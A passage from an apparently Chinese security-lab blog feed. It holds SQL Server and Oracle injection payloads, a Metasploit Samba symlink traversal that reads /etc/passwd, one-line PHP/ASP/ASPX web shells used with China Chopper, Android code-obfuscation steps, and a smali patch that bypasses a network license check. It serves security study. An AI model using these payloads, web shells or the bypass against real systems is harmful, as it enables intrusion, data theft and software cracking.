<li><p>quotename(表名)<br><code>select quotename() from user for xml path(&#39;&#39;)</code><br><code>?id=0&#39; union select 1,2,(select quotename(table_name) from information_schema.tables for xml path(&#39;&#39;)) --+</code><br><code>?id=0&#39; union select 1,2,(select quotename(column_name) from information_schema.columns where table_name=&#39;users&#39; for xml path(&#39;&#39;)) --+</code></p>
</li>
<li><p>sql server 排除法</p>
</li>
<li><p>where 列名 not in 排除法<br><code>where name not in(&#39;database1&#39;,&#39;database2&#39;)</code></p>
</li>
<li><p>master..sysdatabases获取数据库名<br><code>?id=0&#39; union select 1,2,name from master..sysdatabases where name not in(&#39;master&#39;,&#39;model&#39;,&#39;msdb&#39;,&#39;ReportServer&#39;,&#39;ReportServerTempDB&#39;) --+</code></p>
</li>
<li><p>sys.sysobjects表，存放所有数据库表名的表，xtype是S是system，U是user<br><code>?id=0&#39; union select 1,2,name from sysobjects where xtype=&#39;U&#39; --+</code></p>
</li>
<li><p>sys.syscolumns表，存放所有数据库列名的表，通过id确定表<br><code>?id=0&#39; union select 1,2,name from syscolumns where id=(select id from sysobjects where name=&#39;users&#39; and xtype=&#39;U&#39;) and name not in (&#39;id&#39;) --+</code></p>
</li>
</ul>
</li>
<li><p>报错注入</p>
<ul>
<li><code>?id=0&#39; and 1=(@@version) --+</code></li>
<li><code>?id=1&#39; and 1=(select quotename(table_name) from information_schema.tables for xml path(&#39;&#39;)) --+</code></li>
<li>convert()把时间定义一个数据类型<ul>
<li>convert(data_type(length),data_to_beconverted,style)</li>
</ul>
</li>
<li>cast()将数据类型转换为另一种数据类型<ul>
<li>select cast(@@version as int)</li>
</ul>
</li>
</ul>
</li>
<li><p>布尔盲注</p>
<ul>
<li><code>/?id=1&#39; and ascii(substring(db_name(),1,1))&gt;100 --+</code></li>
</ul>
</li>
<li><p>时间盲注</p>
<ul>
<li>waitfor delay ‘00:00:02’查询动作等待2秒后反馈结果<ul>
<li><code>if(ascii(substring((db_name()),1,1))&gt;100) begin waitfor delay &#39;00:00:00&#39; end else begin waitfor delay &#39;00:00:02&#39; end --+</code></li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="oracle-注入"><a href="#oracle-注入" class="headerlink" title="oracle 注入"></a>oracle 注入</h3><ol>
<li>数据类型保持一致<ul>
<li>判断数据类型，dual是oracle的虚表<br><code>?id=0&#39; union select &#39;1&#39;,null,null from dual --+</code>出现报错，则第一个数据类型为整形，若没有报错，则为字符型<br><code>?id=1&#39; union select 1,&#39;2&#39;,&#39;3&#39; from dual --+</code>判断回显位</li>
<li>wm_concat(),多行变一行，user_tables是表名，user_tab_columns是列名<ul>
<li><code>?id=1&#39; union select 1,&#39;2&#39;,(select wm_concat(table_name) from user_tables) from dual --+</code></li>
<li><code>?id=1&#39; union select 1,&#39;2&#39;,(select wm_concat(column_name) from user_tab_columns where table_name=&#39;USER&#39;) from dual --+</code></li>
<li><code>?id=1&#39; union select 1,&#39;2&#39;,(select wm_concat(column_name) from user_tab_columns where table_name=&#39;USERS&#39;) from dual --+</code></li>
</ul>
</li>
</ul>
</li>
</ol>
]]></content>
      <tags>
        <tag>sql</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sysmlink漏洞</title>
    <url>/blog/2021/12/20/sysmlink%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="sysmlink-目录遍历漏洞"><a href="#sysmlink-目录遍历漏洞" class="headerlink" title="sysmlink 目录遍历漏洞"></a>sysmlink 目录遍历漏洞</h2><h3 id="利用sysmlink漏洞读取目标主机的passwd文件内容"><a href="#利用sysmlink漏洞读取目标主机的passwd文件内容" class="headerlink" title="利用sysmlink漏洞读取目标主机的passwd文件内容"></a>利用sysmlink漏洞读取目标主机的passwd文件内容</h3><h4 id="原理：Samba是一套实现SMB（server-messages-block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含-的目录遍历符的软连接-，可以进行目录遍历以及访问任意文件。"><a href="#原理：Samba是一套实现SMB（server-messages-block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含-的目录遍历符的软连接-，可以进行目录遍历以及访问任意文件。" class="headerlink" title="原理：Samba是一套实现SMB（server messages block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含..的目录遍历符的软连接 ，可以进行目录遍历以及访问任意文件。"></a>原理：Samba是一套实现SMB（server messages block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含..的目录遍历符的软连接 ，可以进行目录遍历以及访问任意文件。</h4><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>使用<code>nmap -sV ip</code> 扫描主机，确认开放<code>445</code>，<code>139</code>端口且安装了<code>samba</code>服务，版本为3</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220165606561.png" alt="image-20211220165606561"></p>
<p>命令行输入<code>search samba</code>，搜索samba的相关工具和载荷。</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173445099.png" alt="image-20211220173445099"></p>
<p>终端中输入<code>use auxiliary/admin/smb/samba_symlink_traversal</code>，启用漏洞利用模块</p>
<p>输入<code>info</code>，<code>&quot;yes&quot;</code>表示必须要填写的信息</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173527544.png" alt="image-20211220173527544"></p>
<p>输入<code>set RHOST 192.168.1.3</code>和<code>set SMBSHARE tmp</code>，设置主机ip地址和SAM可写文件</p>
<p>输入exploit开始攻击</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173602852.png" alt="image-20211220173602852"></p>
<p>新建终端，输入<code>smbclient //192.168.1.3/tmp</code>，直接回车，无密码</p>
<p>输入<code>cd rootfs</code>,进入rootfs目录，输入ls，列出目录</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173635907.png" alt="image-20211220173635907"></p>
<p>输入<code>more /etc/passwd</code></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173656794-16399930170041.png" alt="image-20211220173656794"></p>
<p>此实验完成</p>
]]></content>
      <tags>
        <tag>msf</tag>
        <tag>sysmlink</tag>
      </tags>
  </entry>
  <entry>
    <title>中国菜刀配合一句话木马基本使用</title>
    <url>/blog/2021/12/27/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="中国菜刀配合一句话木马基本使用"><a href="#中国菜刀配合一句话木马基本使用" class="headerlink" title="中国菜刀配合一句话木马基本使用"></a>中国菜刀配合一句话木马基本使用</h2><p>目的：</p>
<ul>
<li>学习一句话木马</li>
<li>学习菜刀的使用</li>
</ul>
<p>原理：<br>菜刀的主要功能是用来连接一句话木马的，asp、aspx、php的一句话菜刀都可以连，只是这几种一句话语句不一样。</p>
<ul>
<li><p>asp的一句话是：<code>&lt;%eval request(“pass”)%&gt;</code></p>
</li>
<li><p>aspx的一句话是：<code>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],”unsafe”);%&gt;</code></p>
</li>
<li><p>php的一句话是：<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code></p>
</li>
</ul>
<p>过程：</p>
<ul>
<li><p>打开火狐，<a href="http://192.168.1.3:8080/up%EF%BC%8C%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%82%B9%E5%87%BB%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC![image-20211228105130236](https://gitee.com/oxchang/img-host/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105130236.png)">http://192.168.1.3:8080/up，打开文件上传漏洞演示脚本，点击中国菜刀连接一句话木马![image-20211228105130236](https://gitee.com/oxchang/img-host/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105130236.png)</a></p>
</li>
<li><p>点击浏览，上传php文件，木马地址为<a href="http://192.168.1.3:8080/up/images/lubr.php![image-20211228105156422](https://gitee.com/oxchang/img-host/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105156422.png)">http://192.168.1.3:8080/up/images/lubr.php![image-20211228105156422](https://gitee.com/oxchang/img-host/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105156422.png)</a></p>
</li>
<li><p>打开中国菜刀</p>
</li>
<li><p>添加木马地址，密码为lubr，脚本类型php(eval)<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105329855.png" alt="image-20211228105329855"></p>
</li>
<li><p>添加到主界面<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105353101.png" alt="image-20211228105353101"></p>
</li>
<li><p>右键文件管理，即可查看目标服务器的完整目录，也可进行创建文件，修改文件，修改和下载等相关操作<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105418680.png" alt="image-20211228105418680"></p>
</li>
<li><p>右键单击浏览网站，即可实现浏览器功能，浏览该站点<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105439630.png" alt="image-20211228105439630"></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>木马</tag>
        <tag>一句话</tag>
      </tags>
  </entry>
  <entry>
    <title>代码混淆</title>
    <url>/blog/2021/12/27/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</url>
    <content><![CDATA[<h2 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h2><p>目的：</p>
<ul>
<li>JAVA编程实现Android手机代码混淆，并使用反编译查看效果</li>
</ul>
<p>原理：</p>
<ul>
<li>代码混淆(Obfuscated code)亦称花指令，是保护APP常见技术之一，方法是将程序代码转换成一种功能上等价，但是难于阅读和理解的形式，本实验介绍使用代码混淆技术对抗静态分析。混淆就是对发布出去的程序进行重新组织和处理，使得处理后的代码与处理前代码完成相同的功能，而混淆后的代码很难被反编译，即使反编译成功也很难得出程序的真正语义。被混淆过的程序代码，仍然遵照原来的档案格式和指令集，执行结果也与混淆前一样，只是混淆器将代码中的所有变量、函数、类的名称变为简短的英文字母代号，在缺乏相应的函数名和程序注释的情况下，即使被反编译，也将难以阅读。同时混淆是不可逆的，在混淆的过程中一些不影响正常运行的信息将永久丢失，这些信息的丢失使程序变得更加难以理解。混淆器的作用不仅仅是保护代码，它也有精简编译后程序大小的作用。由于以上介绍的缩短变量和函数名以及丢失部分信息的原因，编译后jar文件体积大约能减少25% ，这对当前费用较贵的无线网络传输是有一定意义的。</li>
</ul>
<p>过程：</p>
<ul>
<li><p>打开Eclipse，依次按照New-Project的顺序点击，然后选择 Android Application Project，新建一个可以执行的工程<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229092846142.png" alt="image-20211229092846142"></p>
</li>
<li><p>添加应用名称与项目名称（name为SimpleEdu23,第一个SDK选择API14，其余默认），其他设置默认选择<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229092927117.png" alt="image-20211229092927117"></p>
</li>
<li><p>点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093002017.png" alt="image-20211229093002017"></p>
</li>
<li><p>选择相应位置，点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093028747.png" alt="image-20211229093028747"></p>
</li>
<li><p>选择Blank Activity，点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093051916.png" alt="image-20211229093051916"></p>
</li>
<li><p>输入Activity名称等信息，点击finish<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093159974.png" alt="image-20211229093159974"></p>
</li>
<li><p>打开android工程的project.properties文件<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093358762.png" alt="image-20211229093358762"></p>
</li>
<li><p>在project.properties文件中增加下面一行代码proguard.config=prouard-project.txt<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093451991.png" alt="image-20211229093451991"></p>
</li>
<li><p>项目在<a href="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E4%B8%AD%E5%A6%82%E6%9E%9C%E5%BC%95%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%EF%BC%8C%E9%9C%80%E8%A6%81%E5%9C%A8%E6%B7%B7%E6%B7%86%E7%9A%84%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8A%A0%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%E5%A3%B0%E6%98%8E%EF%BC%8C%E9%83%A8%E5%88%86%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%E8%99%BD%E7%84%B6%E5%9C%A8%E6%B7%B7%E6%B7%86%E8%84%9A%E6%9C%AC%E4%B8%AD%E8%BF%9B%E8%A1%8C%E4%BA%86%E5%A3%B0%E6%98%8E%EF%BC%8C%E4%BD%86%E6%98%AF%E5%9C%A8%E6%B7%B7%E6%B7%86%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%BB%8F%E5%B8%B8%E4%BC%9A%E5%8F%91%E7%8E%B0%E5%86%85%E9%83%A8%E7%B1%BB%E6%88%96%E8%80%85%E5%BC%95%E7%94%A8%E6%96%87%E4%BB%B6%E6%89%BE%E4%B8%8D%E5%88%B0%E7%9A%84%E7%8E%B0%E8%B1%A1%EF%BC%8C%E8%BF%99%E7%A7%8D%E7%8E%B0%E8%B1%A1%E5%9C%A8android-support-v4.jar%E4%B8%AD%E6%9B%B4%E4%B8%BA%E5%B8%B8%E8%A7%81![image-20211229093615763](https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093615763.png)">https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/中如果引入第三方jar包，需要在混淆的脚本文件中加入第三方jar包声明，部分第三方jar包虽然在混淆脚本中进行了声明，但是在混淆过程中经常会发现内部类或者引用文件找不到的现象，这种现象在android-support-v4.jar中更为常见![image-20211229093615763](https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093615763.png)</a></p>
</li>
<li><p>在proguard-project.txt添加以下代码</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-libraryjars ./libs/android-support-v4.jar</span><br><span class="line">-downwarn android.support.v4.**</span><br><span class="line">-downwarn **CompatHoneycomb</span><br><span class="line">-downwarn **CompatHoneycombMR2</span><br><span class="line">-downwarn **CompatCreatorHoneycombMR2</span><br><span class="line">-keep <span class="class"><span class="keyword">interface</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.<span class="title">app</span>.**</span>&#123;*;&#125;</span><br><span class="line">-keep <span class="class"><span class="keyword">class</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.**</span>&#123;*;&#125;</span><br><span class="line">-keep <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.**</span></span><br><span class="line"><span class="class">-<span class="title">keep</span> <span class="title">public</span> <span class="title">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">app</span>.<span class="title">Fragment</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>点击file，选择export<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094244824.png" alt="image-20211229094244824"></p>
</li>
<li><p>选择export android application<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094303845.png" alt="image-20211229094303845"></p>
</li>
<li><p>点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094340365.png" alt="image-20211229094340365"></p>
</li>
<li><p>生成证书加密（点击browse选择路径），本实验所有密码为123456<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094428828.png" alt="image-20211229094428828"></p>
</li>
<li><p>选择Alias并输入密码，点击next<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094501941.png" alt="image-20211229094501941"></p>
</li>
<li><p>点击browse选择生成的APK保存路径<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094535011.png" alt="image-20211229094535011"></p>
</li>
<li><p>使用JD-GUI<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095219086.png" alt="image-20211229095219086"></p>
</li>
<li><p>用解压缩工具解压simpleedu23.apk，得到classes.dex<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095342782.png" alt="image-20211229095342782"></p>
</li>
<li><p>将classes.dex与dex2jar放在同一目录<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095427029.png" alt="image-20211229095427029"></p>
</li>
<li><p>Cmd执行指令d2j-dex2jar.bat classes.dex<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095743092.png" alt="image-20211229095743092"></p>
</li>
<li><p>在dex2jar目录下获得目标程序的源代码<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095802525.png" alt="image-20211229095802525"></p>
</li>
<li><p>用jd-gui打开jar包，得到反编译后的源代码<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095848546.png" alt="image-20211229095848546"></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>代码混淆</tag>
      </tags>
  </entry>
  <entry>
    <title>使用网络抓包进行网络验证破解</title>
    <url>/blog/2021/12/28/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="使用网络抓包进行网络验证破解"><a href="#使用网络抓包进行网络验证破解" class="headerlink" title="使用网络抓包进行网络验证破解"></a>使用网络抓包进行网络验证破解</h2><p>目的：</p>
<ul>
<li>学会使用网络抓包方式分析网络验证方法，破解验证机制</li>
</ul>
<p>原理：</p>
<ul>
<li>网络验证是指软件运行时与互联网进行一些认证。通过向服务器发送请求反馈信息，对于静态的信息，分析人员能够手动获取信息的所有内容，破解时相对简单，只需在验证点补丁上相应信息即可。</li>
</ul>
<p>过程：</p>
<p>将network安装到模拟器运行并点击按钮<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229135933543.png" alt="image-20211229135933543"></p>
<p>联网后点击执行功能按钮</p>
<p>抓包的过程需要在联网环境下才能完成，另外因原网址失效，抓不到演示程序的通信数据包，可直接使用抓取的数据包C:\AndroidSec\SimpleEdu46\capture.pcap进行分析。</p>
<p>在实验目录AndroidSec\SimpleEdu46下进入adb shell 运行命令“mount -o remount rw /”后输入exit退出。<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229140059286.png" alt="image-20211229140059286"></p>
<p>将tcpdump push到sdcard 上，执行“adb push tcpdump /sdcard/tcpdump”。<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229140147104.png" alt="image-20211229140147104"></p>
<p>进入adb shell，对tcpdump进行提权，执行“adb shell chmod 777 /sdcard/ tcpdump”（此处一定要对tcpdump进行提权否则会出现readonly权限不够的情况）。<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229140302748.png" alt="image-20211229140302748"></p>
<p>执行命令开始抓包，执行“adb shell tcpdump -p -vv -s 0 -w /sdcard/capture.pcap”<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229140408451.png" alt="image-20211229140408451"></p>
<p>回到程序界面，点击执行功能按钮</p>
<p>回到命令窗按下CTRL+C停止抓包<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229140516685.png" alt="image-20211229140516685"></p>
<p>执行adb pull /sdcard/capture.pcap命令，将抓到的数据包导出。<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229141451091.png" alt="image-20211229141451091"></p>
<p>导出的文件会放在当前文件夹里。<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229141725491.png" alt="image-20211229141725491"></p>
<p>在开始菜单—&gt;所有程序里找到wirkshark，用wireshark打开抓包文件（注：这里可以用提供的数据包查看之前抓到的数据）。<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229142443458.png" alt="image-20211229142443458"></p>
<p>在搜索栏里输入http并按回车键查看相关的数据<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229144232643.png" alt="image-20211229144232643"></p>
<p>点击GET请求右键追踪TCP流<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229144309999.png" alt="image-20211229144309999"></p>
<p>发现请求内容是固定的</p>
<p>反编译network.apk。将network.apk放到apktool所在的文件夹，命令行定位到该文件夹并运行apktool d [-s] -f C:\AndroidSec\SimpleEdu46\apktool\network.apk -o C:\AndroidSec\SimpleEdu46\apktool\out<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229144812626.png" alt="image-20211229144812626"></p>
<p>打开C:\AndroidSec\SimpleEdu46\apktool\out\smali\com\droider\network文件夹中的Mainactivity$1.smali文件，用editplus打开，搜索onClick()方法<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229144927017.png" alt="image-20211229144927017"></p>
<p>找到access$2方法，仅保留access$​2方法的调用并删除param p1,”v”，修改后的代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># virtual methods</span><br><span class="line"></span><br><span class="line">.<span class="function">method <span class="keyword">public</span> <span class="title">onClick</span><span class="params">(Landroid/view/View;)</span>V</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">.locals 1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">.prologue</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">:cond_0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">iget-object v0, p0, Lcom/droider/network/MainActivity$1</span>;-&gt;<span class="keyword">this</span>$<span class="number">0</span>:Lcom/droider/network/MainActivity;</span><br><span class="line"></span><br><span class="line"># invokes: Lcom/droider/network/MainActivity;-&gt;getData()V</span><br><span class="line"></span><br><span class="line">invoke-<span class="keyword">static</span> &#123;v0&#125;, Lcom/droider/network/MainActivity;-&gt;access$<span class="number">2</span>(Lcom/droider/network/MainActivity;)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line"></span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>



